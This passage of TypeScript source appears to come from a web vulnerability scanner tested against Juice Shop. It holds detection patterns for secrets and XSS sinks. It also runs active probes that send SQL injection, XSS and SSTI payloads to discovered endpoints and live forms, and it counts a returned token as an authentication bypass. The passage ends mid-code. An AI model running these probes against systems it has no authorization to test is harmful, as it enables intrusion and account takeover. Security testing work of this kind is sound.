        // The old code stripped all hashes, causing ALL Juice Shop pages to collapse to
        // http://localhost:3001/ which was already visited — so only 1 page was ever scanned.
        const targetHost = new URL(targetUrl).hostname;
        for (const link of discoveredLinks) {
          try {
            const cleanLink = new URL(link, targetUrl);
            // For SPA hash routing, the hash IS the page identity — preserve it
            // For normal pages, strip the hash to avoid duplicate crawl of anchors
            const isHashRoute = cleanLink.hash.startsWith('#/'); // /#/login, /#/basket etc.
            if (!isHashRoute) cleanLink.hash = "";
            const linkStr = cleanLink.toString();
            if (
              cleanLink.hostname === targetHost &&
              !visitedUrls.has(linkStr) &&
              !urlQueue.includes(linkStr)
            ) {
              urlQueue.push(linkStr);
            }
          } catch { /* skip */ }
        }

        const staticApiEndpoints = extractApiEndpoints(renderedHtml, normalizedUrl);
        const apiEndpoints = [...new Set([...staticApiEndpoints, ...browserApiEndpoints])];
        const discoveredParamUrls = extractParamUrls(renderedHtml, normalizedUrl);
        const discoveredForms = extractForms(renderedHtml, normalizedUrl);

        if (controller.signal.aborted) throw new Error("scan_cancelled");

        log(`🕸️   Page audit complete — ${discoveredLinks.length} links, ${apiEndpoints.length} API refs, ${discoveredParamUrls.length} param URLs, ${discoveredForms.length} form(s)`);

        // JS bundle analysis
        log(`🔬  Scanning JS bundles for endpoints and secrets...`);
        const jsBundleEndpoints = await extractJsBundleEndpoints(renderedHtml, normalizedUrl);
        if (jsBundleEndpoints.length > 0) {
          log(`🎯  JS analysis found ${jsBundleEndpoints.length} injectable POST endpoint(s): ${jsBundleEndpoints.map(e => e.path).join(", ")}`);
        }

        // OpenAPI / Swagger discovery (runs only on homepage to avoid redundant spec probing)
        if (normalizedUrl === targetUrl) {
          log(`📋  Probing for OpenAPI/Swagger specs to discover hidden API surface...`);
          const openApiEndpoints = await discoverOpenApiEndpoints(targetUrl, log);
          if (openApiEndpoints.length > 0) {
            // Merge with jsBundleEndpoints — both feed the same injection probes
            jsBundleEndpoints.push(...openApiEndpoints);
            log(`🔗  OpenAPI endpoints merged: ${jsBundleEndpoints.length} total injectable endpoint(s)`);
          }
        }

        // ── API ENDPOINT INVENTORY REGISTRATION ─────────────────────────────
        const allDiscoveredApiRoutes = [...new Set([
          ...jsBundleEndpoints.map(e => e.path),
          ...apiEndpoints,
        ])];
        if (allDiscoveredApiRoutes.length > 0) {
          for (const apiRoute of allDiscoveredApiRoutes.slice(0, 30)) {
            const fullApiUrl = safeUrlJoin(normalizedUrl, apiRoute) || apiRoute;
            const matchingBundle = jsBundleEndpoints.find(e => e.path === apiRoute);
            const fieldsStr = matchingBundle && matchingBundle.fields.length > 0 ? matchingBundle.fields.join(", ") : "n/a";
            findings.push({
              type: "api-endpoint-discovered",
              severity: "INFO",
              url: fullApiUrl,
              parameter: fieldsStr !== "n/a" ? fieldsStr : undefined,
              evidence: `Discovered active API endpoint surface route: ${apiRoute} (Parameters/Fields: ${fieldsStr}). Extracted from JS bundles, network interception, or OpenAPI specifications.`,
              cvssScore: 0.0,
              cveId: "CWE-200",
              confidence: CONFIDENCE.DETERMINISTIC,
              validationSteps: [`API route "${apiRoute}" identified during surface mapping`],
              isVerified: true,
            });
          }
        }

        // Framework fingerprinting (L2)
        const techs: string[] = [...runtimeFrameworks];
        const serverHeader = headers["server"] ?? "";
        const poweredBy = headers["x-powered-by"] ?? "";
        const setCookie = headers["set-cookie"] ?? "";
        const combinedText = renderedHtml + poweredBy + serverHeader + setCookie;

        if (!techs.includes("Next.js") && /__NEXT_DATA__|_next\/static/i.test(combinedText)) techs.push("Next.js");
        if (!techs.includes("Nuxt.js") && /window\.__nuxt__|__NUXT__|_nuxt\//i.test(combinedText)) techs.push("Nuxt.js");
        if (!techs.includes("Angular") && /ng-version=|angular\.js|app-root|router-outlet/i.test(combinedText)) techs.push("Angular");
        if (!techs.includes("Vue.js") && /__VUE__|window\.__vue__|data-v-/i.test(combinedText)) techs.push("Vue.js");
        if (!techs.includes("React") && /react(?:\.production|\.development)?\.js|__react|_reactListening|data-reactroot/i.test(combinedText)) techs.push("React");
        if (!techs.includes("SvelteKit") && /__sveltekit|sveltekit-preload/i.test(combinedText)) techs.push("SvelteKit");
        if (!techs.includes("Remix") && /__remix_server_manifest__|remix-island/i.test(combinedText)) techs.push("Remix");
        if (!techs.includes("Gatsby") && /gatsby-chunk-mapping|gatsby-image/i.test(combinedText)) techs.push("Gatsby");
        if (!techs.includes("Astro") && /astro-page|\/@astrojs\//i.test(combinedText)) techs.push("Astro");
        if (!techs.includes("Django") && /csrfmiddlewaretoken|csrftoken|django/i.test(combinedText)) techs.push("Django");
        if (!techs.includes("Flask") && /werkzeug|flask/i.test(combinedText)) techs.push("Flask");
        if (!techs.includes("FastAPI") && /fastapi|uvicorn|swagger-ui|redoc-container/i.test(combinedText)) techs.push("FastAPI");
        if (/gunicorn|uvicorn|werkzeug|python/i.test(combinedText)) techs.push("Python");
        if (/wp-content\/|wp-includes\//i.test(combinedText)) techs.push("WordPress");
        if (/drupal\.settings|Drupal\./i.test(combinedText)) techs.push("Drupal");
        if (/Joomla!/i.test(combinedText)) techs.push("Joomla");
        if (/shopify\.com\/s\/files/i.test(combinedText)) techs.push("Shopify");
        if (/jquery[.-]([\d.]+)(\.min)?\.js/i.test(combinedText)) techs.push("jQuery");
        if (/laravel_session|laravel\/framework/i.test(combinedText)) techs.push("Laravel");
        if (/\/api\/trpc\//i.test(combinedText)) techs.push("tRPC");
        if (/\/@vite\/client|vite\.config/i.test(combinedText)) techs.push("Vite");
        if (/express/i.test(poweredBy)) techs.push("Express.js");
        if (/php/i.test(poweredBy + setCookie)) techs.push("PHP");
        if (/asp\.net|\.AspNetCore/i.test(poweredBy + setCookie)) techs.push("ASP.NET");
        if (/JSESSIONID|spring/i.test(setCookie + combinedText)) techs.push("Spring Boot");
        if (/_session_id|rails/i.test(setCookie + combinedText)) techs.push("Ruby on Rails");
        const uniqueTechs = [...new Set(techs)];
        if (uniqueTechs.length > 0) {
          findings.push({
            type: "technology-fingerprinting",
            severity: "INFO",
            url: normalizedUrl,
            evidence: `Detected technology stack: ${uniqueTechs.join(", ")}.`,
            cvssScore: 2.0,
            cveId: "CWE-200",
          });
        }

        // DOM XSS sinks (D1-D2)
        const DOM_XSS_SINKS = [
          { pattern: /document\.write\s*\(/g, label: "document.write()" },
          { pattern: /\.innerHTML\s*=/g, label: ".innerHTML assignment" },
          { pattern: /\.outerHTML\s*=/g, label: ".outerHTML assignment" },
          { pattern: /eval\s*\(/g, label: "eval()" },
          { pattern: /setTimeout\s*\(\s*[`"']/g, label: "setTimeout(string)" },
          { pattern: /setInterval\s*\(\s*[`"']/g, label: "setInterval(string)" },
          { pattern: /new\s+Function\s*\(/g, label: "new Function()" },
          { pattern: /location\.href\s*=\s*(?!["']https?)/g, label: "location.href = user-controlled" },
          { pattern: /location\.assign\s*\(/g, label: "location.assign()" },
          { pattern: /location\.replace\s*\(/g, label: "location.replace()" },
          { pattern: /dangerouslySetInnerHTML/g, label: "dangerouslySetInnerHTML (React)" },
          { pattern: /bypassSecurityTrustHtml/g, label: "bypassSecurityTrustHtml (Angular)" },
          { pattern: /\$sce\.trustAsHtml/g, label: "$sce.trustAsHtml (AngularJS)" },
          { pattern: /v-html\s*=/g, label: "v-html directive (Vue)" },
          { pattern: /insertAdjacentHTML\s*\(/g, label: "insertAdjacentHTML()" },
        ];
        const htmlSinks: string[] = [];
        const inlineScripts = [...renderedHtml.matchAll(/<script[^>]*>([\s\S]*?)<\/script>/gi)].map(m => m[1]).join("\n");
        for (const { pattern, label } of DOM_XSS_SINKS) {
          if (label.includes("dangerouslySetInnerHTML")) {
            // FP-FIX: Only flag dangerouslySetInnerHTML when it directly receives
            // URL-sourced data. Every Next.js/React app uses dangerouslySetInnerHTML
            // internally (for <head>, __NEXT_DATA__, styled-jsx). The words 'router',
            // 'params', 'query' match next/router in ALL Next.js apps.
            // Instead, look for dangerouslySetInnerHTML near URL data sources
            // within the same code block (inline scripts only).
            if (pattern.test(inlineScripts)) {
              // Check inline scripts for dangerouslySetInnerHTML + direct URL-source data
              const urlSourcePattern = /(?:location\.search|location\.hash|document\.URL|window\.location\.href|URLSearchParams|document\.referrer)[\s\S]{0,200}dangerouslySetInnerHTML|dangerouslySetInnerHTML[\s\S]{0,200}(?:location\.search|location\.hash|document\.URL|window\.location\.href|URLSearchParams|document\.referrer)/i;
              if (urlSourcePattern.test(inlineScripts)) {
                htmlSinks.push(label);
              }
            }
          } else if (label.includes("eval") || label.includes("document.write")) {
            if (pattern.test(inlineScripts)) htmlSinks.push(label);
          } else {
            if (pattern.test(renderedHtml)) htmlSinks.push(label);
          }
          pattern.lastIndex = 0;
        }
        if (htmlSinks.length > 0) {
          findings.push({
            type: "js-dangerous-sink",
            severity: "HIGH",
            url: normalizedUrl,
            evidence: `DOM XSS sinks detected in page source: ${htmlSinks.join(", ")}.`,
            cvssScore: 7.5,
            cveId: "CWE-79",
          });
        }

        // CSRF checks (C1-C2)
        const formMatches2 = [...renderedHtml.matchAll(/<form[^>]*method=["']?post["']?[^>]*>([\s\S]*?)<\/form>/gi)];
        const csrfTokenPatterns = /csrf|_token|authenticity_token|__requestverificationtoken|nonce/i;
        let htmlFormCsrfReported = false;
        for (const form of formMatches2) {
          const formBody = form[1] || "";
          if (!csrfTokenPatterns.test(formBody) && !htmlFormCsrfReported) {
            findings.push({
              type: "csrf-missing-token",
              severity: "HIGH",
              url: normalizedUrl,
              evidence: "A POST form was found on the page without a CSRF token.",
              cvssScore: 8.0,
              cveId: "CWE-352",
            });
            htmlFormCsrfReported = true;
            break;
          }
        }

        const SPA_CSRF_PATHS = ["/rest/user/login", "/api/login", "/api/auth/login", "/api/v1/auth/login", "/api/user", "/api/profile", "/api/orders", "/api/basket", "/api/feedback"];
        let spaCsrfFound = false;
        for (const path of SPA_CSRF_PATHS) {
          if (spaCsrfFound) break;
          try {
            const csrfUrl = new URL(path, normalizedUrl).toString();
            const resp = await fetch(csrfUrl, {
              method: "POST",
              headers: { "Content-Type": "text/plain", "User-Agent": FETCH_HEADERS["User-Agent"] },
              body: "email=test@test.com&password=test",
              signal: AbortSignal.timeout(5000),
              // @ts-ignore
              next: { revalidate: 0 },
            }).catch(() => null);

            if (resp && resp.status >= 200 && resp.status < 300) {
              const bodyText = await resp.text().catch(() => "");
              const isConfirmed = bodyText.includes("token") || bodyText.includes("success") || bodyText.includes("user") || bodyText.includes("id");
              spaCsrfFound = true;
              findings.push({
                type: "csrf-missing-token",
                severity: isConfirmed ? "HIGH" : "INFO",
                url: csrfUrl,
                evidence: `CSRF vulnerability ${isConfirmed ? "detected" : "signal"} on REST API endpoint ${path}.`,
                cvssScore: isConfirmed ? 7.5 : 0.0,
                cveId: "CWE-352",
              });
            }
          } catch { /* skip */ }
        }

        // SQLi Error Disclosure (E1-E2)
        const sqlErrorPatterns = [/SQL syntax.*MySQL/i, /Warning.*mysql_/i, /MySQLSyntaxErrorException/i, /valid MySQL result/i, /PostgreSQL.*ERROR/i, /PSQLException/i, /ORA-\d{4,}/i, /Microsoft OLE DB.*SQL Server/i, /Unclosed quotation mark/i, /SQLiteException/i, /org\.hibernate\.exception/i, /You have an error in your SQL syntax/i, /ODBC SQL Server Driver/i, /Syntax error.*in query expression/i];
        const matchedSqlError = sqlErrorPatterns.find((p) => p.test(renderedHtml));
        if (matchedSqlError) {
          findings.push({
            type: "sql-injection-error-disclosure",
            severity: "CRITICAL",
            url: normalizedUrl,
            evidence: "The server is leaking raw SQL error messages in its HTTP response.",
            cvssScore: 9.8,
            cveId: "CWE-89",
          });
        }

        if (/at\s+[\w.]+\([\w./]+:\d+:\d+\)|Traceback \(most recent call last\)|Stack trace:/i.test(renderedHtml)) {
          findings.push({
            type: "stack-trace-disclosure",
            severity: "HIGH",
            url: normalizedUrl,
            evidence: "A full stack trace was found in the HTTP response.",
            cvssScore: 7.5,
            cveId: "CWE-209",
          });
        }

        // Secrets leak (F1-F3)
        const secretPatterns = [
          { label: "AWS Access Key", pattern: /AKIA[0-9A-Z]{16}/ },
          { label: "Generic API key", pattern: /api[_-]?key\s*[:=]\s*["'][A-Za-z0-9_\-]{20,}["']/i },
          { label: "Bearer token", pattern: /bearer\s+[A-Za-z0-9\-._~+/]+=*/i },
          { label: "Private key header", pattern: /-----BEGIN (RSA |EC )?PRIVATE KEY-----/ },
          { label: "Stripe secret key", pattern: /sk_(live|test)_[0-9a-zA-Z]{24}/ },
          { label: "SendGrid API key", pattern: /SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}/ },
          { label: "Password in source", pattern: /password\s*[:=]\s*["'][^"']{6,}["']/i },
        ];
        for (const { label, pattern } of secretPatterns) {
          if (pattern.test(renderedHtml)) {
            findings.push({
              type: "sensitive-data-exposure",
              severity: "CRITICAL",
              url: normalizedUrl,
              evidence: `Possible secret detected in HTML source: "${label}".`,
              cvssScore: 9.5,
              cveId: "CWE-312",
            });
            break;
          }
        }

        if (!normalizedUrl.startsWith("https://") && /<input[^>]+type=["']?password["']?/i.test(renderedHtml)) {
          findings.push({
            type: "password-over-http",
            severity: "CRITICAL",
            url: normalizedUrl,
            evidence: "A password input field was found on a plain HTTP page.",
            cvssScore: 9.1,
            cveId: "CWE-319",
          });
        }

        if (normalizedUrl.startsWith("https://")) {
          const httpRefs = (renderedHtml.match(/(?:src|href|action)=["']http:\/\//gi) || []).length;
          if (httpRefs > 0) {
            findings.push({
              type: "mixed-content",
              severity: "MEDIUM",
              url: normalizedUrl,
              evidence: `Found ${httpRefs} reference(s) to insecure HTTP resources on an HTTPS page.`,
              cvssScore: 5.4,
              cveId: "CWE-311",
            });
          }
        }

        // Open Redirect param check (H1)
        const redirectParamPattern = /(?:href|action)=["'][^"']*[?&](?:redirect|url|next|return|goto|dest|destination|rurl|target)=(?:https?:\/\/|\/\/)/gi;
        if (redirectParamPattern.test(renderedHtml)) {
          findings.push({
            type: "open-redirect",
            severity: "MEDIUM",
            url: normalizedUrl,
            evidence: "A link or form action was found containing a redirect parameter.",
            cvssScore: 6.1,
            cveId: "CWE-601",
          });
        }

        // IDOR numeric ID detection (L3)
        const idorPatterns = [/\/api\/[^/\s]+\/\d+/i, /\/rest\/[^/\s]+\/\d+/i, /\/users?\/\d+/i, /\/orders?\/\d+/i, /\/products?\/\d+/i, /[?&](?:id|user_id|order_id|product_id|account_id)=\d+/i];
        const idorUrls = [...discoveredLinks, ...apiEndpoints, ...discoveredParamUrls].filter((u) => idorPatterns.some((p) => p.test(u)));
        if (idorUrls.length > 0) {
          findings.push({
            type: "idor-numeric-id",
            severity: "MEDIUM",
            url: idorUrls[0],
            evidence: `Discovered sequential numeric IDs in URLs (e.g. ${idorUrls[0]}).`,
            cvssScore: 6.5,
            cveId: "CWE-639",
          });
        }

        // JWT token analysis (L6)
        if (cookieHeaders.length > 0) {
          const JWT_RE = /^[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/;
          for (const cookie of cookieHeaders) {
            const name = cookie.split("=")[0]?.trim() ?? "token";
            const value = cookie.split("=")[1]?.split(";")[0]?.trim() ?? "";
            if (JWT_RE.test(value)) {
              try {
                const headerB64 = value.split(".")[0];
                const pad = "=".repeat((4 - (headerB64.length % 4)) % 4);
                const decoded = JSON.parse(Buffer.from(headerB64 + pad, "base64url").toString());
                if (decoded.alg === "none" || decoded.alg === "None") {
                  findings.push({
                    type: "jwt-alg-none",
                    severity: "CRITICAL",
                    url: normalizedUrl,
                    parameter: name,
                    evidence: `JWT in cookie "${name}" has alg:"none".`,
                    cvssScore: 9.8,
                    cveId: "CWE-345",
                  });
                } else if (decoded.alg) {
                  findings.push({
                    type: "jwt-detected",
                    severity: "INFO",
                    url: normalizedUrl,
                    parameter: name,
                    evidence: `JWT token detected in cookie "${name}" using algorithm ${decoded.alg}.`,
                    cvssScore: 3.5,
                    cveId: "CWE-327",
                  });
                }
              } catch { /* skip */ }
              break;
            }
          }
        }

        // Subdomain Takeover signals (L10)
        const takeoverSignal = detectSubdomainTakeoverSignals(renderedHtml, normalizedUrl);
        if (takeoverSignal) findings.push(takeoverSignal);

        // SSRF parameters (L11)
        const ssrfFinding = detectSSRF(renderedHtml, discoveredParamUrls, normalizedUrl);
        if (ssrfFinding) findings.push(ssrfFinding);

        // JS files analysis (L12)
        log(`🔬  Scanning JS files for secrets and sinks...`);
        const jsFindings = await analyzeJSFiles(renderedHtml, normalizedUrl);
        findings.push(...jsFindings);

        // Broken Auth default creds (L13)
        const loginForms = [...renderedHtml.matchAll(/<form[^>]*>([\s\S]*?)<\/form>/gi)];
        for (const formMatch of loginForms.slice(0, 3)) {
          const formBody = formMatch[1] || "";
          if (!/type=["']?password["']?/i.test(formBody)) continue;
          const fullForm = formMatch[0];
          const actionMatch = fullForm.match(/action=["']([^"']+)["']/i);
          const formAction = actionMatch ? new URL(actionMatch[1], normalizedUrl).toString() : normalizedUrl;
          const userFieldMatch = formBody.match(/name=["'](user(?:name)?|email|login|account)["']/i);
          const passFieldMatch = formBody.match(/name=["'](pass(?:word)?|pwd|secret)["']/i);
          const userField = userFieldMatch ? userFieldMatch[1] : "username";
          const passField = passFieldMatch ? passFieldMatch[1] : "password";
          const brokenAuthFinding = await probeBrokenAuth(formAction, userField, passField);
          if (brokenAuthFinding) {
            findings.push(brokenAuthFinding);
            break;
          }
        }

        // Active injection probing (Phase 8)
        const probeTargets = [...new Set(discoveredParamUrls)].slice(0, 30);

        // Inject stored-XSS markers for next-page detection
        await injectStoredXSSMarkers(discoveredForms, discoveredParamUrls, normalizedUrl, storedXSSMarkers, session);

        // Check if a previously injected stored-XSS marker surfaced on this page
        const storedXSSResult = checkStoredXSSReflection(renderedHtml, normalizedUrl, storedXSSMarkers);
        if (storedXSSResult) findings.push(storedXSSResult);

        if (probeTargets.length > 0) {
          log(`⚡  Active injection probes (SQLi, XSS, CmdInj, PathTraversal) on ${probeTargets.length} URL(s)...`);
          const probeResults = await Promise.all(
            probeTargets.flatMap((url) => [
              probeReflectedXSS(url, session),
              probeSQLiError(url, session),
              probeCommandInjection(url),
              probePathTraversal(url),
              probeCRLFInjection(url),
            ])
          );

          let xssFound = false; let sqliFound = false;
          let cmdInjFound = false; let lfiFound = false;
          let deserFound = false; let blindSsrfFound = false;
          let crlfFound = false;

          for (const result of probeResults) {
            if (!result) continue;
            if (result.type === "reflected-xss" && !xssFound) { findings.push(result); xssFound = true; }
            else if (result.type === "sql-injection-reflected" && !sqliFound) { findings.push(result); sqliFound = true; }
            else if (result.type === "command-injection" && !cmdInjFound) { findings.push(result); cmdInjFound = true; }
            else if (result.type === "path-traversal-lfi" && !lfiFound) { findings.push(result); lfiFound = true; }
            else if (result.type === "crlf-injection" && !crlfFound) { findings.push(result); crlfFound = true; }
          }

          // Deserialization & Blind SSRF probes
          const gapFixResults = await Promise.all(
            probeTargets.flatMap((url) => [
              probeInsecureDeserialization(url),
              probeBlindSSRFWithTiming(url),
            ])
          );
          for (const result of gapFixResults) {
            if (result?.type === "insecure-deserialization" && !deserFound) { findings.push(result); deserFound = true; }
            else if (result?.type === "blind-ssrf-timing" && !blindSsrfFound) { findings.push(result); blindSsrfFound = true; }
          }
        }

        // Form-based injection probing (Phase 9)
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        if (discoveredForms.length > 0) {
          log(`📝  Form injection probing on ${discoveredForms.length} form(s)...`);
          const formProbeResults = await Promise.all(
            discoveredForms.flatMap((form) => [
              probeFormSQLi(form, session),
              probeFormXSS(form, session),
              probeFormSSTI(form),
            ])
          );

          let formSqliFound = false; let formXssFound = false; let formSstiFound = false;
          for (const result of formProbeResults) {
            if (!result) continue;
            if (result.type === "sql-injection-form" && !formSqliFound) { findings.push(result); formSqliFound = true; }
            else if (result.type === "reflected-xss-form" && !formXssFound) { findings.push(result); formXssFound = true; }
            else if (result.type === "ssti-injection-form" && !formSstiFound) { findings.push(result); formSstiFound = true; }
          }
        }

        // REST/JSON API SQLi probing (Phase 9b)
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        log(`🔐  Probing REST/JSON API SQLi...`);
        let apiSqliFound = false;
        if (jsBundleEndpoints.length > 0) {
          for (const endpoint of jsBundleEndpoints) {
            if (controller.signal.aborted) throw new Error("scan_cancelled");
            if (apiSqliFound) break;
            const endpointUrl = new URL(endpoint.path, targetUrl).toString();
            for (const payload of SQLI_PAYLOADS) {
              if (controller.signal.aborted) throw new Error("scan_cancelled");
              if (apiSqliFound) break;
              for (const field of endpoint.fields) {
                if (controller.signal.aborted) throw new Error("scan_cancelled");
                if (apiSqliFound) break;
                const body: Record<string, string> = {};
                for (const f of endpoint.fields) body[f] = f === field ? payload : "test";

                try {
                  const resp = await fetch(endpointUrl, {
                    method: "POST",
                    headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"], "Accept": "application/json" },
                    body: JSON.stringify(body),
                    signal: AbortSignal.timeout(7000),
                    // @ts-ignore
                    next: { revalidate: 0 },
                  }).catch(() => null);

                  if (!resp) continue;
                  const text = await resp.text();

                  const hitPattern = SQL_ERROR_PATTERNS_ACTIVE.find((p) => p.test(text));
                  if (hitPattern) {
                    findings.push({
                      type: "sql-injection-reflected",
                      severity: "CRITICAL",
                      url: endpointUrl,
                      parameter: field,
                      evidence: `SQL Injection confirmed via JS-discovered REST endpoint. Field: ${field}, Payload: ${payload}.`,
                      cvssScore: 9.8,
                      cveId: "CWE-89",
                    });
                    apiSqliFound = true;
                    break;
                  }

                  if (resp.status === 200 && (text.includes("token") || text.includes("authentication") || text.includes("Bearer")) && (payload.includes("OR") || payload.includes("1=1") || payload.includes("--"))) {
                    findings.push({
                      type: "sql-injection-reflected",
                      severity: "CRITICAL",
                      url: endpointUrl,
                      parameter: field,
                      evidence: `SQL Injection Auth Bypass confirmed via JS-discovered REST endpoint. Field: ${field}.`,
                      cvssScore: 9.8,
                      cveId: "CWE-89",
                    });
                    apiSqliFound = true;
                    break;
                  }
                } catch { /* skip */ }
              }
            }
          }
        }

        if (!apiSqliFound) {
          const restSqliResult = await probeRestApiSQLi(normalizedUrl, session);
          if (restSqliResult) findings.push(restSqliResult);
        }

        // IMPROVEMENT #3: Run SSTI + Command Injection probes on JS-discovered endpoints
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        if (jsBundleEndpoints.length > 0) {
          log(`🧪  Probing JS-discovered endpoints for SSTI and Command Injection...`);
          for (const endpoint of jsBundleEndpoints.slice(0, 3)) {
            if (controller.signal.aborted) throw new Error("scan_cancelled");
            try {
              const endpointUrl = new URL(endpoint.path, targetUrl).toString();
              for (const field of endpoint.fields) {
                if (controller.signal.aborted) throw new Error("scan_cancelled");
                // SSTI via JSON body
                for (const { payload, marker, engines } of SSTI_PROBES) {
                  try {
                    const body: Record<string, string> = {};
                    for (const f of endpoint.fields) body[f] = f === field ? payload : "test";
                    const resp = await fetch(endpointUrl, {
                      method: "POST",
                      headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
                      body: JSON.stringify(body),
                      signal: AbortSignal.timeout(6000),
                      // @ts-ignore
                      next: { revalidate: 0 },
                    }).catch(() => null);
                    if (!resp) continue;
                    const text = await resp.text();
                    if (text.includes(marker) && !text.includes(payload)) {
                      // Multi-math verification to rule out coincidental number reflection
                      let mathHits = 0;
                      const confirmExprs = [{ p: "{{7*8}}", e: "56" }, { p: "{{100*2}}", e: "200" }];
                      for (const { p, e } of confirmExprs) {
                        try {
                          const confirmBody: Record<string, string> = {};
                          for (const f of endpoint.fields) confirmBody[f] = f === field ? p : "test";
                          const r2 = await fetch(endpointUrl, {
                            method: "POST",
                            headers: { "Content-Type": "application/json", "User-Agent": FETCH_HEADERS["User-Agent"] },
                            body: JSON.stringify(confirmBody),
                            signal: AbortSignal.timeout(5000),
                            // @ts-ignore
                            next: { revalidate: 0 },
                          }).catch(() => null);
                          if (!r2) continue;
                          const b2 = await r2.text();
                          if (b2.includes(e) && !b2.includes(p)) mathHits++;
                        } catch { /* next */ }
                      }
                      if (mathHits < 1) continue; // Skip single coincidental match

                      findings.push({
                        type: "ssti-injection",
                        severity: "CRITICAL",
                        url: endpointUrl,
                        parameter: field,
                        evidence: `SSTI confirmed via JS-discovered API endpoint (multi-math verified). Expression "${payload}" in JSON field "${field}" was evaluated by the template engine (${engines}) and returned "${marker}" along with ${mathHits}/2 math confirmations.`,
                        cvssScore: 9.8,
                        cveId: "CWE-94",
                        confidence: CONFIDENCE.EXEC_VERIFIED,
                        validationSteps: [`"${payload}" → "${marker}" in JSON field "${field}"`, `${mathHits}/2 additional math expressions evaluated`],
                        isVerified: true,
                      });
                    }
                  } catch { /* next */ }
                }
              }
            } catch { /* next endpoint */ }
          }
        }

        // Advanced probes (SSTI, blind timing SQLi, boolean-blind SQLi, prototype pollution) (Phase 10)
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        if (probeTargets.length > 0) {
          log(`🧪  Advanced probes (SSTI, Blind SQLi Timing+Boolean, Prototype Pollution, HTML injection)...`);
          const advancedResults = await Promise.all(
            probeTargets.flatMap((url) => [
              probeSSTI(url),
              probeBlindSQLiTiming(url),
              probeBlindSQLiBooleanDiff(url),
              probePrototypePollution(url),
              probeHTMLInjection(url),
            ])
          );
          let sstiFound = false; let blindSqliTimingFound = false;
          let blindSqliBooleanFound = false;
          let protoFound = false; let htmlInjFound = false;
          for (const result of advancedResults) {
            if (!result) continue;
            if (result.type === "ssti-injection" && !sstiFound) { findings.push(result); sstiFound = true; }
            else if (result.type === "sql-injection-blind-timing" && !blindSqliTimingFound) { findings.push(result); blindSqliTimingFound = true; }
            else if (result.type === "sql-injection-blind-boolean" && !blindSqliBooleanFound) { findings.push(result); blindSqliBooleanFound = true; }
            else if (result.type === "prototype-pollution" && !protoFound) { findings.push(result); protoFound = true; }
            else if (result.type === "html-injection" && !htmlInjFound) { findings.push(result); htmlInjFound = true; }
          }
        }

        // ── PHASE 9c: INTERACTIVE BROWSER-BASED INJECTION ─────────────────────────
        // Uses Playwright to type payloads into live forms, click submit,
        // and analyze the actual network request/response.
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        if (discoveredForms.length > 0 || probeTargets.length > 0) {
          log(`🎭  Phase 9c: Interactive browser injection (typing payloads into live forms)...`);
          const interactiveResults = await interactiveFormInjection(
            normalizedUrl, log, scanId, browserAuthSession, 5, 3
          );

          for (const ir of interactiveResults) {
            // Analyze the captured response for SQLi indicators
            if (ir.payloadCategory === "sqli") {
              const sqlHit = SQL_ERROR_PATTERNS_ACTIVE.find(p => p.test(ir.responseBody));
              if (sqlHit) {
                findings.push(verifiedFinding(
                  {
                    type: "sql-injection-reflected",
                    severity: "CRITICAL",
                    url: ir.requestUrl,
                    parameter: ir.fieldName,
                    evidence: `SQL Injection confirmed via interactive browser injection. Payload "${ir.payload}" typed into field "${ir.fieldName}" triggered SQL error in response. Request: ${ir.requestMethod} ${ir.requestUrl}`,
                    cvssScore: 9.8,
                    cveId: "CWE-89",
                  },
                  [`Typed payload "${ir.payload}" into field "${ir.fieldName}"`, `Submitted form via browser click`, `Response (${ir.responseStatus}) contained SQL error pattern`],
                  CONFIDENCE.EXEC_VERIFIED
                ));
              }
              // Check for auth bypass: SQLi payload + successful login response
              if (
                ir.responseStatus === 200 &&
                (ir.responseBody.includes("token") || ir.responseBody.includes("authentication") || ir.responseBody.includes("Bearer")) &&
                (ir.payload.includes("OR") || ir.payload.includes("1=1") || ir.payload.includes("--"))
              ) {
                findings.push(verifiedFinding(
                  {
                    type: "sql-injection-auth-bypass",
                    severity: "CRITICAL",
                    url: ir.requestUrl,
                    parameter: ir.fieldName,
                    evidence: `SQL Injection Authentication Bypass confirmed via browser interaction. Payload "${ir.payload}" in field "${ir.fieldName}" returned an auth token. An attacker can bypass login without valid credentials.`,
                    cvssScore: 9.8,
                    cveId: "CWE-89",
                  },
                  [`Typed SQLi payload into login form`, `Received auth token in response`],
                  CONFIDENCE.EXEC_VERIFIED
                ));
              }
            }

            // Analyze for XSS reflection
            if (ir.payloadCategory === "xss") {
              if (ir.responseBody.includes(ir.payload) || ir.responseBody.includes("<vulnscanXSStag>")) {
                findings.push(verifiedFinding(
                  {
                    type: "reflected-xss",
                    severity: "HIGH",
                    url: ir.requestUrl,
                    parameter: ir.fieldName,
                    evidence: `Reflected XSS confirmed via interactive browser injection. Payload "${ir.payload}" typed into field "${ir.fieldName}" was reflected unescaped in the response.`,
                    cvssScore: 7.5,
                    cveId: "CWE-79",
                  },
                  [`Typed XSS payload into field "${ir.fieldName}"`, `Payload reflected in response body`],
                  CONFIDENCE.EXEC_VERIFIED
                ));
              }
            }

            // Analyze for SSTI (Interactive SSTI is already multi-math verified by probeFormSSTI and probeSSTI)
          }
        }

        // Infrastructure probes on current page's APIs
        if (controller.signal.aborted) throw new Error("scan_cancelled");
        const apiEndpointsForMethods = extractApiEndpoints(renderedHtml, normalizedUrl);
        const infraResults = await Promise.all([
          probeHostHeaderInjection(normalizedUrl),
          probeCachePoisoning(normalizedUrl),
          probeHTTPRequestSmuggling(normalizedUrl),
          probeCORSReflection(normalizedUrl, [...apiEndpoints, ...jsBundleEndpoints.map(e => { try { return new URL(e.path, normalizedUrl).toString(); } catch { return ""; } }).filter(Boolean)], session),
          probeDangerousHTTPMethods(normalizedUrl, apiEndpointsForMethods),
          probeXXE(normalizedUrl),
          probeDirectoryListing(normalizedUrl, homepageHtml),
          probeHTTPSRedirect(normalizedUrl),
          probeUnauthenticatedAPIAccess(normalizedUrl),
          probeDebugModeExposure(normalizedUrl),
          probeNoSQLi(normalizedUrl, jsBundleEndpoints),
          probeJWTNone(normalizedUrl),
          probeExposedBackupFiles(normalizedUrl, homepageHtml),
